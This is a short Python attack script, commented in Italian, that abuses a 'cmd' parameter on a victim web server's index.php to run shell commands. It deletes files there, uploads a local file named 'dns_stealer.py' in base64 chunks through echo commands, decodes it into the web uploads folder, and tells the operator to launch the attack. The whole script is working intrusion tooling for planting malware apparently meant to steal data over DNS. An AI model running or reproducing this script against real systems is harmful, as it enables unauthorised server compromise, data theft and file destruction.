import requests
import base64
import sys
import time

VICTIM_URL = "http://10.0.10.100/index.php"
MALWARE_FILE = "dns_stealer.py"    
REMOTE_B64  = "/var/www/html/uploads/malware.b64"
REMOTE_FILE = "/var/www/html/uploads/dns_malware.py"

def inject():
    try:
        with open(MALWARE_FILE, 'rb') as f:
            content = f.read()
    except FileNotFoundError:
        print(f"[!] Errore: Non trovo il file '{MALWARE_FILE}' nella cartella corrente!")
        sys.exit()

    b64_data = base64.b64encode(content).decode()
    
    print("[*] Pulisco la destinazione remota...")
    requests.get(VICTIM_URL, params={"cmd": f"rm {REMOTE_B64} {REMOTE_FILE}"})

    chunk_size = 500
    total_chunks = len(b64_data) // chunk_size + 1
    print(f"[*] Invio {len(b64_data)} bytes in {total_chunks} pezzi...")

    for i in range(0, len(b64_data), chunk_size):
        chunk = b64_data[i:i+chunk_size]
        
        cmd = f"echo -n {chunk} >> {REMOTE_B64}"
        
        try:
            requests.get(VICTIM_URL, params={"cmd": cmd})
            sys.stdout.write(f"\r[+] Chunk {i//chunk_size + 1}/{total_chunks} inviato")
            sys.stdout.flush()
        except Exception as e:
            print(f"\n[!] Errore di connessione: {e}")
            sys.exit()
        
        time.sleep(0.05) # Piccola pausa per non intasare

    print("\n[*] Upload completato. Decodifica in corso...")
    
    decode_cmd = f"base64 -d {REMOTE_B64} > {REMOTE_FILE}"
    requests.get(VICTIM_URL, params={"cmd": decode_cmd})
    
    print(f"[SUCCESS] Malware caricato in: {REMOTE_FILE}")
    print("[*] Ora lancia il comando di attacco!")

if __name__ == "__main__":
    inject()